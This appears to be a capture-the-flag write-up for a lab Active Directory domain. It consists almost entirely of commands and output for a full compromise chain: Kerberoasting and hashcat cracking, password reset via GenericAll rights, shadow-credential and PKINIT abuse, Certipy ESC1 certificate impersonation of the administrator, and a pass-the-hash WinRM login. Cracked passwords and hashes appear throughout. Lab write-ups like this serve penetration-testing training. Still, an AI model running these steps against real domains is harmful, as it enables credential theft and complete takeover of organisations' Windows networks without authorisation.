## Assumed breach creds
`hacksmarter.local\faraday:hacksmarter123`
                                                                                                                                  

## Used nxc to get kerberoastable users
```
┌──(kali㉿kali)-[~/hacksmarter/arasaka]
└─$ nxc ldap 10.1.178.204 -u faraday -p hacksmarter123 --kerberoasting kerberoasting.txt
LDAP        10.1.178.204    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.local)
LDAP        10.1.178.204    389    DC01             [+] hacksmarter.local\faraday:hacksmarter123 
LDAP        10.1.178.204    389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.1.178.204    389    DC01             [*] Total of records returned 1
LDAP        10.1.178.204    389    DC01             [*] sAMAccountName: alt.svc, memberOf: [], pwdLastSet: 2025-09-21 23:07:42.894050, lastLogon: <never>
LDAP        10.1.178.204    389    DC01             $krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$hacksmarter.local\alt.svc*$aa012774099540370083a965991ee110$0d39744a67590379e8316be1163e20abc8ce5f4095a01f02714eb1bad08a9ccd6b98ff1ffb9d2bd0d0477a9df9870fb81d7064ae61a5d380323a376b5925b2e131a248d8737870c97fc256187de6e2aa8420014dcb94bdc2f1185b73249a57fe34161d7a41b9d49184fbb9a6765261abab5e8aff93312bca8143d92580281117dfb6b4c12d96843311203f31f671610f836cc06ad79da762a9444287473714b24de234315329f6c6d6c861461b03a1d0129695a06bd3480aa1941e421fc6fbad575d2f63e5e895e78361b8c5bc494b7e652549e4a9bf6471a137f8ac288744762ec804174ce6fdc9331a786b790d29ceb7e4ce59574cdda9770240653c46593622817ca5b3eecbbc5720a5cf8cdaa7a79c6d77d09627c7f6d50bc98738a3064724164650d0faba264421f76841f513599673e08c1cc3825dc12148bfd53b4cf801e51e7c0d89f0f383ac4c5ab1b5764c2fce0e38b332ac821dc20a48df2cc9117400de87f51a9c04c362d81e64ef8d795ea762199868194b0d7f3f9fe49f1dabe94ba9b63778e459a341634d57ade33cbccee45c2947f25eb448721982d2cbfb515def707dfee23cdcd3a3f7da2f6372e9dba15a9626e52d0750a1f1965ae56808398257fa368d1d306c15eae88ca6f008af1326b24f9deb4b080cf2b04be4903184d4ff69b2da56b4ce4c832a9be5b5d799081c807f4656213eabcaf3600034afe7f42244bcb888cdba68969a9c0a2bac8193e7dbf26b72ddec9f4e52044f3a28c4c4e74c5aff1b0406040b1f2287b751f18a2de5ceedcd6d7c3e761119ca0f8a12e06eb2a3b4816c638a04f6187008babe62e0e86be6d95e8ebcec7abd824460f22457e768c38de48cf1ad810d18302c610b6c40185767d2b35020186cd942767f159e134dc22ec8d0420b2885811f2d08910cf38145cbc93eaeca1df746e192ee16c98d5537e7713fa1c599ba6400a0b0c26fa9ee07a6a3eb531f8d1655004a651497815ea25afed689b433ec98fc865c395e42532d5245755b137485636fe89514441e0f5b18a3e6eb585839f6cb318be834db91328ab8ed40ee6d261bab02dc98f0cf38cbafc0eabc84520f11b4afaf12412313a56776e143aff2257c55cfba7ec7d5619a6e653a64bc202a24a614f7960467afffc469f7da0c0199bb5ac525d94edf8c57551f423d836ab5f5d0b2bbff6f357ee1e4f992bbe2d96ac5dcbe667ed1e91cec8ae81bcc8284a7934827e0fb4c960c2b6282d3ad270a89b805fa166c64d7bd4903d021142bba1fb8e7a7ba3f006a5efa506623989db3387ee2ffcb507c06d05e2e60cac5cb9f98febdb523131119955c4e3c92546469dcf24658f663fdd8349674a5035eec7729695207e15cb7ad72278c911fd9d05e4a04becf7a6e5d31cf7843e29b3cd2f03e66073bd46e999d95eddaa1867382a795b643edaa8d1fe562222d8a28542a2f555cd7f51eaf1e888551a40d4f23c799c7f4ac253969df16ca603ed7cdf19d8d7bc609d2573108ce31e60d06
```


## Hashcat cracking alt.svc hashes
```
% hashcat -a 0 -m 13100  kerberoasting.txt kaonashi14M.txt
hashcat (v7.1.2) starting

METAL API (Metal 370.63.1)
==========================
* Device #01: Apple M4 Pro, skipped

OpenCL API (OpenCL 1.2 (Aug  2 2025 21:16:03)) - Platform #1 [Apple]
====================================================================
* Device #02: Apple M4 Pro, GPU, 26542/53084 MB (4976 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 100c

Host memory allocated for this attack: 652 MB (32335 MB free)

Dictionary cache built:
* Filename..: kaonashi14M.txt
* Passwords.: 14344391
* Bytes.....: 138263610
* Keyspace..: 14344391
* Runtime...: 0 secs

$krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$hacksmarter.local/alt.svc*$f10e881eafd3dda134fd1fc45cb5674c$59cb023c604cc7b2134d095f043cdfa87da900f3e7fbb1c854e187a9de6d9962cd048dcc4b27542f0c3a255b21fc18b6d7fcf6a7f51d99fd6a300b3f433a7fc84c40ebd3f332274991895e27933460adccef8e0b07609f470c1a580960c1f8fd2ae5f1ca4080b25251da8e99a0de4899bc19ff87770780c18327114a15b96f3b1b4a5e41892d20b04a0b690e1b40e6c02c11feadfdc7e3972914ef1eb06e9b267610236e1c1dc83289608b910feea33b9a8c0e5d62d5cb04895956ec44c7528cf7d6845500b9b60b29c76bd995e041668cdb568ff6d6fd2f288dd86a552893acc6e0194b080827ca9ca7bf46cdc128625d900151a0c6c41cc47782c7be6a1f49084701861567bf2bfc317f4bc6b501a45ed576f00f9ea86f92b33f6bd4bf8bbe4f6ac4c514cbb0c2b0229502cdf51294441fd05d535747d0287a4cf24e4bff903f72448eb3e44fed16b003819f9e05ad43a942bcfbcf68500dcd6f04c476562ec105361437fae1c9ae4d2de81a76dddb80248aa8bb9485061ba661286ba542cd6cf3b83214a1387d2327eb5a013601261145e48b8346bc61ff23dc76a2f2e57d6357194677a6a8de39e1b2199678feda110c97232b325d426c457fe76791a03ef5f802f459d5dc5b0fed3ad35a8fdd8f19e5099cfb46102a71bea63240ed327f5b416d4ca41601e89e75922903ef5b0918768d8b7dc268fd1f9ada382df3872edac1df47f680a50ba10ff4dfab61de5f55f2781f1d9dd55e22f6d6f9909b80446995baaae67c6f8f5a4c9935d86f2bcd7177f9ae6c8219ebb108c4ad0e4846ab73bb952c60bee3a2cfda9f1ff3571a70416e58dc88f08ca02842bdabc33bf8e4b71001abf76692623d08037092b76a4f929924f3f68459ca2aed4cfd45dceb05e06bd395e5b0b2b935dc743b57fbe06cb2c91138afb6a8fa50ff495df8201d62f08a3b9d97826d1bfe05de68b672536a8f7bf2646ce73ebb8b1e62c3653e8a613c976a589aa84f878cc2baf91a35f3c111449e74d58e8e220d4c20ff01dcc4f8258e78e85632a9ecbc2e3463d85b5dfad8cb2dd5c332742514f43791e4c91064627d1acad697d27a873d4d99e995e0aa3fd96d94cc6f6785070fd309523d1deadb32a12415b3dce38a913760648782cecda592bacaf447088fa4b616eebfce81901c6be289d6d34c0950c99dc7c9281acc2c3010cb08e7403a19338ec7ce68453acc253f358cca6a2700636b3c3076a0f285d645b5b69feb55cf001ad1f00b0f3bc6489749d54145c79408802ff20ebd5705b5287035f68df56ce5094897e4f0aa8beb080881c7ce88d7bed52d1544b8eedd4b3b16406ce2926b2a27587deb2a83f882890df99e65dd7966c69f38c56773f0812499d0626e4672fd106c94fb622ddee802e7aff654105dbb367ef72416fb476e1329cc86d69519f95e5174e72f4af9daa4dec83ec012fa56c2178adf0638ce7ccaebe3dc7f2bcede8247db394d5b37bc2da9acbab0cf6cc76084432d8660442164799385006d:babygirl1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$hacksmarter....85006d
Time.Started.....: Sat Oct  4 13:36:40 2025 (1 sec)
Time.Estimated...: Sat Oct  4 13:36:41 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (kaonashi14M.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#02........: 29046.4 kH/s (0.38ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 524288/14344391 (3.66%)
Rejected.........: 0/524288 (0.00%)
Restore.Point....: 0/14344391 (0.00%)
Restore.Sub.#02..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#02...: 123456 -> audiavant
Hardware.Mon.SMC.: Fan0: 20%
Hardware.Mon.#02.: Util: 32% Pwr:152mW

Started: Sat Oct  4 13:36:33 2025
Stopped: Sat Oct  4 13:36:41 2025
```


## The creds work for alt.svc
```
┌──(kali㉿kali)-[~/hacksmarter/arasaka]
└─$ nxc smb hacksmarter.local -u alt.svc -p babygirl1
SMB         10.1.178.204    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False)
SMB         10.1.178.204    445    DC01             [+] hacksmarter.local\alt.svc:babygirl1 
```


## alt.svc has GenericAll privileges on yorinobu                                                                                                 
```
┌──(kali㉿kali)-[~/hacksmarter/arasaka]
└─$ net rpc password "yorinobu" "Password123" -U "hacksmarter.local"/"alt.svc"%"babygirl1" -S "10.1.178.204"
```


## Winrm possible with yorinobu account
```
┌──(kali㉿kali)-[~/hacksmarter/arasaka]
└─$ evil-winrm -i 10.1.178.204 -u yorinobu -p Password123
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Yorinobu\Documents> 
```


## Get password-protected cert(pfx) of soulkiller.svc as yorinobu has GenericWrite on soulkiller.svc account
```
┌──(pywhisker)─(kali㉿kali)-[~/hacksmarter/arasaka/pywhisker]
└─$ ./pywhisker.py -d "hacksmarter.local" -u yorinobu --target soulkiller.svc -p Password123  --action "add" -f soulkiller
[*] Searching for the target account
[*] Target user found: CN=Soulkiller.svc,CN=Users,DC=hacksmarter,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: ea2d0b01-d1c9-e5db-03cd-8476363555e3
[*] Updating the msDS-KeyCredentialLink attribute of soulkiller.svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: soulkiller.pfx
[+] PFX exportiert nach: soulkiller.pfx
[i] Passwort für PFX: 2D2bnavVhzh5wkw3CY1D
[+] Saved PFX (#PKCS12) certificate & key at path: soulkiller.pfx
[*] Must be used with password: 2D2bnavVhzh5wkw3CY1D
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```


## Request TGT and get hash
```
┌──(PKINITtools)─(kali㉿kali)-[~/hacksmarter/arasaka/PKINITtools]
└─$ python3 gettgtpkinit.py -cert-pfx ./soulkiller.pfx -pfx-pass 2D2bnavVhzh5wkw3CY1D hacksmarter.local/soulkiller.svc soulkiller.svc.ccache         
2025-10-04 22:45:52,797 minikerberos INFO     Loading certificate and key from file
2025-10-04 22:45:52,827 minikerberos INFO     Requesting TGT
2025-10-04 22:46:23,334 minikerberos INFO     AS-REP encryption key (you might need this later):
2025-10-04 22:46:23,334 minikerberos INFO     0d6be09b735f7d2f15742086c32e7d73bb38f27ccc98e67c8be71a7cd3b3e59a
2025-10-04 22:46:23,342 minikerberos INFO     Saved TGT to file

┌──(PKINITtools)─(kali㉿kali)-[~/hacksmarter/arasaka/PKINITtools]
└─$ export KRB5CCNAME=$(pwd)/soulkiller.svc.ccache         
                                                                                                                                                                             
┌──(PKINITtools)─(kali㉿kali)-[~/hacksmarter/arasaka/PKINITtools]
└─$ python3 getnthash.py -key 0d6be09b735f7d2f15742086c32e7d73bb38f27ccc98e67c8be71a7cd3b3e59a hacksmarter.local/soulkiller.svc
/home/kali/hacksmarter/arasaka/PKINITtools/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
f4ab68f27303bcb4024650d8fc5f973a
```


## Crack nt hash with hashcat
```
% hashcat -m 1000 ./nt.txt ./rockyou.txt                                            
hashcat (v7.1.2) starting

METAL API (Metal 370.63.1)
==========================
* Device #01: Apple M4 Pro, skipped

OpenCL API (OpenCL 1.2 (Aug  2 2025 21:16:03)) - Platform #1 [Apple]
====================================================================
* Device #02: Apple M4 Pro, GPU, 26542/53084 MB (4976 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 100c

Host memory allocated for this attack: 793 MB (31871 MB free)

Dictionary cache built:
* Filename..: ./rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 0 secs

f4ab68f27303bcb4024650d8fc5f973a:MYpassword123#           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: f4ab68f27303bcb4024650d8fc5f973a
Time.Started.....: Sat Oct  4 22:55:50 2025 (0 secs)
Time.Estimated...: Sat Oct  4 22:55:50 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (./rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#02........: 37516.7 kH/s (0.08ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11534336/14344384 (80.41%)
Rejected.........: 0/11534336 (0.00%)
Restore.Point....: 10485760/14344384 (73.10%)
Restore.Sub.#02..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#02...: XiaoLing.1215 -> 98624393
Hardware.Mon.SMC.: Fan0: 20%
Hardware.Mon.#02.: Util: 29% Pwr:133mW

Started: Sat Oct  4 22:55:49 2025
Stopped: Sat Oct  4 22:55:51 2025
% hashcat -m 1000 ./nt.txt ./rockyou.txt --show
f4ab68f27303bcb4024650d8fc5f973a:MYpassword123#
```


## Creds confirmed working
```
┌──(kali㉿kali)-[~/hacksmarter/arasaka]
└─$ nxc smb 10.1.178.204 -u soulkiller.svc -p 'MYpassword123#'
SMB         10.1.178.204    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False) 
SMB         10.1.178.204    445    DC01             [+] hacksmarter.local\soulkiller.svc:MYpassword123# 
```


## Look at a list of misconfigured cert templates
```
┌──(kali㉿kali)-[~/hacksmarter/arasaka]
└─$ certipy find -u 'soulkiller.svc' -p 'MYpassword123#' -dc-ip 10.1.178.204 -enabled -hide-admins      
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'hacksmarter-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'hacksmarter-DC01-CA'
[*] Checking web enrollment for CA 'hacksmarter-DC01-CA' @ 'DC01.hacksmarter.local'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20251005010447_Certipy.txt'
[*] Wrote text output to '20251005010447_Certipy.txt'
[*] Saving JSON output to '20251005010447_Certipy.json'
[*] Wrote JSON output to '20251005010447_Certipy.json'
```


## One particular misconfigured template stands out
```
Template Name                       : AI_Takeover
Display Name                        : AI_Takeover
Certificate Authorities             : hacksmarter-DC01-CA
Enabled                             : True
Client Authentication               : True
Enrollment Agent                    : False
Any Purpose                         : False
Enrollee Supplies Subject           : True
Certificate Name Flag               : EnrolleeSuppliesSubject
Enrollment Flag                     : IncludeSymmetricAlgorithms
                                      PublishToDs
Private Key Flag                    : ExportableKey
Extended Key Usage                  : Client Authentication
                                      Secure Email
                                      Encrypting File System
Requires Manager Approval           : False
Requires Key Archival               : False
Authorized Signatures Required      : 0
Schema Version                      : 2
Validity Period                     : 1 year
Renewal Period                      : 6 weeks
Minimum RSA Key Length              : 2048
Template Created                    : 2025-09-21T16:16:36+00:00
Template Last Modified              : 2025-09-21T16:16:36+00:00
Permissions
  Enrollment Permissions
    Enrollment Rights               : HACKSMARTER.LOCAL\Soulkiller.svc
[+] User Enrollable Principals      : HACKSMARTER.LOCAL\Soulkiller.svc
[!] Vulnerabilities
  ESC1                              : Enrollee supplies subject and template allows client authentication.


## Getting a list of domain admins
*Evil-WinRM* PS C:\Users\Yorinobu\Documents> net group 'domain admins'
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            the_emperor
The command completed successfully.
```


## Get administrator SID
```
┌──(PKINITtools)─(kali㉿kali)-[~/hacksmarter/arasaka/PKINITtools]
└─$ certipy account -u soulkiller.svc -p 'MYpassword123#' -dc-ip 10.1.178.204 -user administrator read

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=hacksmarter,DC=local
    name                                : Administrator
    objectSid                           : S-1-5-21-3154413470-3340737026-2748725799-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 512
    whenCreated                         : 2025-09-21T02:51:00+00:00
    whenChanged                         : 2025-10-04T17:37:08+00:00


## Request administrator password-protected certificate (pfx)
┌──(PKINITtools)─(kali㉿kali)-[~/hacksmarter/arasaka/PKINITtools]
└─$ certipy req -u soulkiller.svc -p 'MYpassword123#' -ca hacksmarter-DC01-CA -template AI_Takeover \
-target 10.1.178.204 -upn administrator@hacksmarter.local \
-dns dc01.hacksmarter.local -pfx-password TempPass123 -sid 'S-1-5-21-3154413470-3340737026-2748725799-500'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with multiple identities
    UPN: 'administrator@hacksmarter.local'
    DNS Host Name: 'dc01.hacksmarter.local'
[*] Certificate object SID is 'S-1-5-21-3154413470-3340737026-2748725799-500'
[*] Saving certificate and private key to 'administrator_dc01.pfx'
[*] Wrote certificate and private key to 'administrator_dc01.pfx'
```


## Get administrator NTLM hashes
```
┌──(PKINITtools)─(kali㉿kali)-[~/hacksmarter/arasaka/PKINITtools]
└─$ certipy auth -pfx ./administrator_dc01.pfx -dc-ip 10.1.178.204 -password TempPass123 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@hacksmarter.local'
[*]     SAN DNS Host Name: 'dc01.hacksmarter.local'
[*]     SAN URL SID: 'S-1-5-21-3154413470-3340737026-2748725799-500'
[*]     Security Extension SID: 'S-1-5-21-3154413470-3340737026-2748725799-500'
[*] Found multiple identities in certificate
[*] Please select an identity:
    [0] UPN: 'administrator@hacksmarter.local' (administrator@hacksmarter.local)
    [1] DNS Host Name: 'dc01.hacksmarter.local' (dc01$@hacksmarter.local)
> 0
[*] Using principal: 'administrator@hacksmarter.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec
```


## Logged in as administrator
```
┌──(kali㉿kali)-[~/hacksmarter/arasaka]
└─$ evil-winrm -i 10.1.178.204  -u administrator -H '4366ec0f86e29be2a4a5e87a1ba922ec'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::81c7:2f63:6fbb:667d%8
   IPv4 Address. . . . . . . . . . . : 10.1.178.204
   Subnet Mask . . . . . . . . . . . : 255.255.192.0
   Default Gateway . . . . . . . . . : 10.1.128.1
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----         9/21/2025   3:31 PM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> gc .\root.txt
fcf1dd0f08d1068a2f151fd2ec5ecf05
```